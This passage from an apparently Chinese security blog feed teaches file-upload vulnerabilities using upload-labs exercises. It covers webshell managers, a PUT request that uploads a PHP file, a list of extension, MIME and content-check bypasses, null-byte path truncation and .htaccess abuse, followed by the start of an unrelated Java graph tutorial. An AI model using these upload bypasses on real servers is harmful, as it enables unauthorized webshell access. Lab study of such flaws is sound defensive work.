配合菜刀、蚁剑使用</h3><p>一句话木马短小精悍，功能强大，但是需要配合中国菜刀或者中国蚁剑客户端使用。它们能够实现的功能包括：</p><ul><li>文件管理</li><li>虚拟终端</li><li>数据库管理：此时需要知道连接数据库的账密</li></ul><h4 id="1）中国菜刀"><a href="#1）中国菜刀" class="headerlink" title="1）中国菜刀"></a>1）中国菜刀</h4><p>中国菜刀是一句话木马的管理器，也是命令操作接口。中国菜刀在连接一句话木马的时候需要填写密码(实际上就是变量名)。</p><p>中国菜刀与一句话木马配合实现了三大基本功能，如下。</p><p>@文件管理</p><p>在中国菜刀页面继承Web用户权限可以实现文件管理，包括文件查看、上传、下载、修改、删除甚至运行exe程序等。</p><p>@虚拟终端</p><p>在中国菜刀下可以获得类似于cmd和bash的命令行接口，可以执行相关命令。</p><p>@数据库管理</p><p>我们可以使用中国菜刀进行数据库管理，此时需要知道连接数据库的账密。</p><h4 id="2）蚁剑"><a href="#2）蚁剑" class="headerlink" title="2）蚁剑"></a>2）蚁剑</h4><p>php一句话木马：</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.54.49.png" style="zoom:75%;"><p>连接蚁剑：</p><ul><li>文件管理</li></ul><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.57.44.png" style="zoom:75%;"><ul><li>虚拟终端</li></ul><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%889.58.30.png" style="zoom:75%;"><ul><li>数据库管理</li></ul><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.04.30.png" style="zoom:55%;"><p>配置：密码root</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.06.28.png" style="zoom:45%;"><h2 id="4-4-getshell"><a href="#4-4-getshell" class="headerlink" title="4.4 getshell"></a>4.4 getshell</h2><p>GetShell,顾名思义，就是获取Webshell的过程和结果。当然任意文件上传是GetShell的主要方式，但并不是唯一途径。</p><h1 id="五、文件上传漏洞的基础利用和防御绕过"><a href="#五、文件上传漏洞的基础利用和防御绕过" class="headerlink" title="五、文件上传漏洞的基础利用和防御绕过"></a>五、文件上传漏洞的基础利用和防御绕过</h1><h2 id="5-1-利用条件"><a href="#5-1-利用条件" class="headerlink" title="5.1 利用条件"></a>5.1 利用条件</h2><ul><li>有可访问的文件上传功能</li></ul><p>任意文件上传漏洞，首先要有能上传文件的的地方，即——要有文件上传点。有一些网站虽然貌似没有上传点，但是其实存在上传代码的。虽然没有明确使用上传功能 ，但使用了上传有关的函数，这种情况需要通过代码审计去看。</p><p>最常见的就是上传头像。</p><ul><li><p>写权限+执行权限</p></li><li><p>Web容器可以解析webshell</p></li><li><p>能访问得到上传的文件：如果访问不到，则无法对文件进行控制，也就没有漏洞的说法</p></li><li><p>无视以上条件配置不当：有PUT方法（只要有PUT方法必有文件上传漏洞）</p></li></ul><h2 id="5-2-利用-HTTP-PUT方法上传文件"><a href="#5-2-利用-HTTP-PUT方法上传文件" class="headerlink" title="5.2 利用 HTTP PUT方法上传文件"></a>5.2 利用 HTTP PUT方法上传文件</h2><h3 id="5-2-1-Apache-如何开启-PUT方法"><a href="#5-2-1-Apache-如何开启-PUT方法" class="headerlink" title="5.2.1 Apache 如何开启 PUT方法"></a>5.2.1 Apache 如何开启 PUT方法</h3><h4 id="1）telent-测试-web服务器开启了哪些方法"><a href="#1）telent-测试-web服务器开启了哪些方法" class="headerlink" title="1）telent 测试 web服务器开启了哪些方法"></a>1）telent 测试 web服务器开启了哪些方法</h4><p>​用OPTIONS方法探测目标服务器开启了哪些方法。</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227135124860.png" alt="image-20241227135124860" style="zoom:100%;"><p>可以看到支持的方法有五个，没有开启PUT方法。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">telnet <span class="token number">192.168</span>.33.4 <span class="token number">80</span>OPTIONS / HTTP/1.1HOST:192.168.33.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="2）开启PUT方法"><a href="#2）开启PUT方法" class="headerlink" title="2）开启PUT方法"></a>2）开启PUT方法</h4><ul><li>操作配置文件httpd.conf[记得备份]， 开启dav相关模块</li></ul><p>ctrl +F dav搜索dav</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.49.19.png" style="zoom:75%;"><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.50.17.png" style="zoom:75%;"><p>取消102和103行的注释，开启两个模块。</p><p>启用模块：</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.52.03.png" style="zoom:75%;"><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.52.54.png" style="zoom:75%;"><p>添加DAV On</p><ul><li>开启文件锁【要创建dav文件夹】</li></ul><p>DavLockDB C:\phpstudy\WWW\DavLock 【放在httpd.conf 的第一行】</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.56.33.png" style="zoom:75%;"><p>创建C:\phpstudy\WWW\DavLock目录</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-02%20%E4%B8%8B%E5%8D%888.00.42.png" style="zoom:75%;"><p>重启服务。</p><h4 id="3）再次用OPTIONS方法测试"><a href="#3）再次用OPTIONS方法测试" class="headerlink" title="3）再次用OPTIONS方法测试"></a>3）再次用OPTIONS方法测试</h4><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-06-29%20%E4%B8%8A%E5%8D%8810.59.19.png" style="zoom:55%;"><p>没有PUT方法，但也可以尝试上传文件并成功。</p><h3 id="5-2-2-PUT方法的上传漏洞"><a href="#5-2-2-PUT方法的上传漏洞" class="headerlink" title="5.2.2 PUT方法的上传漏洞"></a>5.2.2 PUT方法的上传漏洞</h3><h4 id="1）利用put方法上传webshell"><a href="#1）利用put方法上传webshell" class="headerlink" title="1）利用put方法上传webshell"></a>1）利用put方法上传webshell</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PUT /php/infosxk.php HTTP/1.1HOST:192.168.33.4Content-Length:18<span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227135916449.png" style="zoom:100%;"><p>⚠️：不要太相信ctrl c ctrl v，有可能会输入其他的字符。  </p><p>访问测试：   </p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-03%20%E4%B8%8A%E5%8D%889.22.15.png" style="zoom:75%;"><h2 id="5-3-防御绕过和利用"><a href="#5-3-防御绕过和利用" class="headerlink" title="5.3 防御绕过和利用"></a>5.3 防御绕过和利用</h2><h3 id="5-3-1-黑白名单策略"><a href="#5-3-1-黑白名单策略" class="headerlink" title="5.3.1 黑白名单策略"></a>5.3.1 黑白名单策略</h3><p>黑白名单是最常用的安全策略之一。在计算机安全中，黑白名单类似于一个列表，列表中写了一些条件或规则，如果“客体”在黑名单中，一律“禁止”，如果“客体”在白名单中，一律“允许”。类似于手机号码的黑白名单。配合使用，白名单优先级更高。</p><ul><li>绕过思路：找黑名单之外的可以上传的后缀，白名单的话不太好绕过。</li><li>但如果是前端的限制，则无论是黑名单和白名单对攻击者来说都是失效的，只需要抓包改包就行了。</li></ul><h3 id="5-3-2-前端限制与绕过"><a href="#5-3-2-前端限制与绕过" class="headerlink" title="5.3.2 前端限制与绕过"></a>5.3.2 前端限制与绕过</h3><p>F1：因为JS脚本的运行环境是浏览器，我们可以修改JS代码，甚至删除表单事件。</p><p>F2：使恶意文件后缀名符合白名单策略，用Burp 挂代理抓包，然后修改文件后缀名即可。</p><p>对于文件上传，只从Web前端进行检测显然防护不足，那么服务器端检测就特别重要了。一般服务器端检测，采用黑白名单策略。</p><h3 id="5-3-3-服务器端限制"><a href="#5-3-3-服务器端限制" class="headerlink" title="5.3.3 服务器端限制"></a>5.3.3 服务器端限制</h3><h4 id="1）MIME检测"><a href="#1）MIME检测" class="headerlink" title="1）MIME检测"></a>1）MIME检测</h4><p>MIME(Multipurpose Internet Mail Extensions)是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。常见的MIME类型如下：</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227142915200.png" style="zoom:100%;"><p>在HTTP协议中，使用Content-Type 字段表示文件的MIME类型。当我们上传文件的时候，抓到HTTP数据包。在服务器端会检测Content-Type类型。</p><p>⚠️：Content-Type 是由浏览器定义的。</p><ul><li>绕过方法：利用BP，修改Content-Type类型绕过，服务器对MIME类型的检测。</li></ul><h4 id="2）文件内容检测"><a href="#2）文件内容检测" class="headerlink" title="2）文件内容检测"></a>2）文件内容检测</h4><p>除了检测上传文件的Content-Type类型，为了保持安全性，服务器端还会检测文件内容。</p><p>PHP中有一个函数getimagesize(),这个函数本意是检查图片的大小,但是在检查之前，该函数会判断目标文件是否是一张图片。 因此，可以用该函数来检测文件的内容。【upload-load 14关。】</p><ul><li>图片木马绕过内容检测（图片木马的制作）【具体方法见<code>图片木马制作</code>一文。】</li></ul><h4 id="3）后缀名检测"><a href="#3）后缀名检测" class="headerlink" title="3）后缀名检测"></a>3）后缀名检测</h4><ul><li>黑名单</li></ul><p>寻找其他未被禁止上传的文件类型做尝试：</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227144344869.png" style="zoom:98%;"><ul><li>白名单</li></ul><p>只能上传白名单格式的文件。</p><p>利用漏洞需要结合其他漏洞（文件解析漏洞等）。</p><h3 id="绕过方法总结"><a href="#绕过方法总结" class="headerlink" title="绕过方法总结"></a>绕过方法总结</h3><ul><li><p>冷门后缀 （php2、php3、php4、php5、phtml、pht…）</p></li><li><p>大小写绕过</p></li><li><p>双写绕过</p></li><li><p>改.htaccess解析 </p></li><li><p>GET/post型00截断 </p></li><li><p>Web容器解析漏洞</p></li><li><p>改.user.ini自动包含</p></li><li><p>Windows特性 空格</p></li><li><p>Windows特性 点. </p></li><li><p>条件竞争</p></li></ul><h1 id="六、-00截断"><a href="#六、-00截断" class="headerlink" title="六、 00截断"></a>六、 00截断</h1><p>00就是Null (空)字符，URL中表现为%00，00截断会导致文件上传路径截断。</p><p>【我们以upload-labs第12关为例子说明这个问题。】</p><p>原理分析：php move_upload_file()函数的实现基于C语言，C语言中，字符串的结尾为\0,null。见到null，C语言会认为该字符串已经结束。利用上述特点，可以截断上传文件的路径，将文件另存为我们想要的目标文件，比如webshell等。</p><h2 id="6-1-upload-labs-12关（EX）"><a href="#6-1-upload-labs-12关（EX）" class="headerlink" title="6.1 upload-labs 12关（EX）"></a>6.1 upload-labs 12关（EX）</h2><p>1、上传phpinfo.php BP抓包测试（直接跳过本地限制这一环，本地限制的绕过过于简单）</p><p>   上传失败：     提示：只允许上传.jpg|.png|.gif类型文件！ </p><p>2、BP抓包改后缀名为合法后缀名。</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%883.47.40.png" style="zoom:75%;"><p>​     src=”../upload//5820210705074748.jpg</p><p>​    上传成功，进行了另存和重命名。</p><p>​     注意到 Content-Type为php也过去了，说明服务器没有对MIME类型做检测。</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%883.50.22.png" style="zoom:75%;"><p>​     注意到内容为php脚本，也过去了，说明服务器没有对内容进行检测。</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/%E6%88%AA%E5%B1%8F2021-07-05%20%E4%B8%8B%E5%8D%883.51.05.png" style="zoom:75%;"><p>​     综上，服务器对上传文件的后缀名做了限制并进行了另存重命名操作。</p><p>3、00截断</p><p>​      URL中默认传递了save_path变量，指明要保存的路径。</p><p>​     /upload-labs-master/Pass-12/index.php?save_path=../upload/</p><p>​    上传的文件被保存在，/upload/目录下。</p><p>​    save_path=../upload/sxk.php 提示上传出错。</p><p>​    根据00截断的原理，实现文件的另存。 </p><p>​    save_path=../upload/sxk.php%00</p><p>​    还是上传出错。 </p><p>​    PHP版本 ，推荐5.2.17   ，其他版本可能会导致部分Pass无法突破。</p><p>​    应该是PHP版本的问题，思路没问题，phpstudy换成5.2.17版本的还是截断不成功。</p><p>【见5.4.2，路径00截断+文件名绕过后缀检测。】</p><h2 id="6-2-PHP-00截断"><a href="#6-2-PHP-00截断" class="headerlink" title="6.2 PHP 00截断"></a>6.2 PHP 00截断</h2><h3 id="1）用在哪里"><a href="#1）用在哪里" class="headerlink" title="1）用在哪里"></a>1）用在哪里</h3><p>​除了php配置的那个解析漏洞之外，正经使用%00截断绕过应该是放在上传文件路径后，而非文件名处。</p><h3 id="2）原理"><a href="#2）原理" class="headerlink" title="2）原理"></a>2）原理</h3><p>0x00是字符串的结束标识符，攻击者通过手动添加字符串结束标识符的方式，将00后面内容截断。但是00后面的东西又能帮助我们绕过文件检测。</p><h3 id="3）条件"><a href="#3）条件" class="headerlink" title="3）条件"></a>3）条件</h3><p>要求GPC处于关闭状态，且php版本小于5.3.29才可利用。</p><h3 id="4）使用"><a href="#4）使用" class="headerlink" title="4）使用"></a>4）使用</h3><ul><li>为什么00截断用在上传后文件目录?</li></ul><p>在文件名中构造00截断，比如1.php%001.jpg。在程序提取后缀名的时候，遇到%00就认为结束了。这个时候，他提取到的后缀名还是.php，然后.php被限制上传，所以绕过失败。</p><p>文件名检测代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$uploaded_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'file'</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token string single-quoted-string">'name'</span> <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$uploaded_ext</span>  <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 提取上传文件后缀</span><span class="token variable">$target_name</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span> <span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$uploaded_name</span> <span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$uploaded_ext</span><span class="token punctuation">;</span> <span class="token comment">// 对上传文件进行重命名</span><span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span> <span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"jpeg"</span> <span class="token operator">||</span> <span class="token class-name">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$uploaded_ext</span> <span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"png"</span> <span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$target_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将临时文件移动到指定目录</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$dir</span> <span class="token operator">.</span> <span class="token variable">$target_name</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Stored in: <span class="token interpolation"><span class="token variable">$result</span></span>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid file"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>正确用法</li></ul><p>在数据包中，含有上传后文件目录的情况才可使用。比如在数据包中存在path：/uploads/</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227150039545.png" a style="zoom:67%;"><p>为什么修改path才可以，因为程序中检测的是文件的后缀名，如果后缀合法则拼接路径和文件名，那么攻击者修改了path以后的拼接结果为：uploads/aaa.php%00/2018051413370000.jpg，移动文件的时候会将文件保存为uploads/aaa.php，从而达到Getshell效果。</p><h3 id="5）-00（urldecode）"><a href="#5）-00（urldecode）" class="headerlink" title="5）%00（urldecode）"></a>5）%00（urldecode）</h3><ul><li>为什么要进行urldecode操作呢？</li></ul><p>原因在于上传的表单中有一个enctype的属性，并且需要enctype=”multipart/form-data” (不对表单中数据进行编码)，path大多数都是存放在表单中的，因此需要在数据包中进行urldecode操作使%00变成字符串结束符号。</p><ul><li>直接添加%00而不进行urldecode操作</li></ul><p>因为path也可以存放在URL或者Cookie中，而在提交数据的时候，浏览器会对数据做一次urldecode的操作，而到服务端，会对数据进行一次urldecode的操作，因此如果path在非enctype=multipart/form-data的表单中或URL or Cookie中的时候，就可以直接写%00不需要进行URLdecode操作，让服务端对%00进行URL解码即可。</p><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227150530357.png" style="zoom:80%;"><p>注意⚠️：</p><p>简单些说，path在url、cookie或者上传方式不是multipart/from-data的时候，就不用进行对%00进行url解码。</p><h1 id="七、-htaccess文件上传"><a href="#七、-htaccess文件上传" class="headerlink" title="七、 .htaccess文件上传"></a>七、 .htaccess文件上传</h1><h2 id="7-1-htaccess文件介绍"><a href="#7-1-htaccess文件介绍" class="headerlink" title="7.1 .htaccess文件介绍"></a>7.1 .htaccess文件介绍</h2><p>.htaccess文件 (或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。 它提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。 .htaccess文件是用于apache服务器下的控制文件访问的配置文件，因此Nginx下是不会生效的。</p><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p><h2 id="7-2-htaccess-文件上传漏洞原理"><a href="#7-2-htaccess-文件上传漏洞原理" class="headerlink" title="7.2 .htaccess 文件上传漏洞原理"></a>7.2 .htaccess 文件上传漏洞原理</h2><img src="/2022/12/06/web-an-quan/wen-jian-shang-chuan-lou-dong-ji-chu/image-20241227150806840.png" style="zoom:80%;"><p>【上传.htaccess文件覆盖更改服务器的配置，按照攻击者目标解析执行上传的文件】</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 文件上传漏洞 </tag>
            
            <tag> 基础知识库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图-图的通用结构表达的建立</title>
      <link href="/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/"/>
      <url>/2022/10/09/shu-ju-jie-gou-yu-suan-fa/tu-tu-de-tong-yong-jie-gou-biao-da-de-jian-li/</url>
      
        <content type="html"><![CDATA[<h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><p>  图的表达方法千千万，平时选一个自己最喜欢的结构，把所有算法都在这个结构上玩通，以后遇到陌生的图结构表达，转化为自己喜欢的那个结构，然后用自己实现的算法即可。重点就是实现一个接口将陌生的图表达数据结构转化为自己熟悉的图结构表达。</p><h1 id="2-Node类"><a href="#2-Node类" class="headerlink" title="2.Node类"></a>2.Node类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span><span class="token comment">//节点值</span><span class="token keyword">public</span> <span class="token keyword">int</span> in<span class="token punctuation">;</span><span class="token comment">//入度</span><span class="token keyword">public</span> <span class="token keyword">int</span> out<span class="token punctuation">;</span><span class="token comment">//出度</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nexts<span class="token punctuation">;</span><span class="token comment">//下行的邻居节点</span><span class="token keyword">public</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token comment">//下行边</span><span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> value<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">this</span><span class="token punctuation">.</span>value<span class="token operator">=</span>value<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>in<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>out<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>nexts<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-Edge类"><a href="#3-Edge类" class="headerlink" title="3.Edge类"></a>3.Edge类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Edge</span> <span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token keyword">int</span> weight<span class="token punctuation">;</span><span class="token comment">//边权</span><span class="token keyword">public</span> <span class="token class-name">Node</span> from<span class="token punctuation">;</span><span class="token comment">//始边</span><span class="token keyword">public</span> <span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">;</span><span class="token comment">//终边</span><span class="token keyword">public</span> <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token keyword">int</span> weight<span class="token punctuation">,</span><span class="token class-name">Node</span> from<span class="token punctuation">,</span><span class="token class-name">Node</span> <span class="token keyword">to</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment">//根据提供的三元素构建一个边</span><span class="token keyword">this</span><span class="token punctuation">.</span>weight<span class="token operator">=</span>weight<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>from<span class="token operator">=</span>from<span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token keyword">to</span><span class="token operator">=</span><span class="token keyword">to</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-Graph类"><a href="#4-Graph类" class="headerlink" title="4.Graph类"></a>4.Graph类</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Graph</span> <span class="token punctuation">{</span><span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">,</span> <span class="token class-name">Node</span><span class="token punctuation">&gt;</span></span> nodes<span class="token punctuation">;</span><span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Edge</span><span class="token punctuation">&gt;</span></span> edges<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>nodes<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>edges<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-将二维矩阵表示的图转化为Graph形式的图"><a href="#5-将二维矩阵表示的图转化为Graph形式的图" class="headerlink" title="5.将二维矩阵表示的图转化为Graph形式的图"></a>5.将二维矩阵表示的图转化为Graph形式的图</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">base_graph</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenerateGraphFromMatrix</span> <span class="token punctuation">{</span><span class="token comment">//matrix </span><span class="token comment">//weight from to</span><span class="token comment">/* * [4,1,3] * [5,2,6] * [1,2,3] */</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Graph</span> <span class="token function">createGraphFromMatrix</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> matrix<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token class-name">Graph</span> g<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Graph</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>matrix<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token 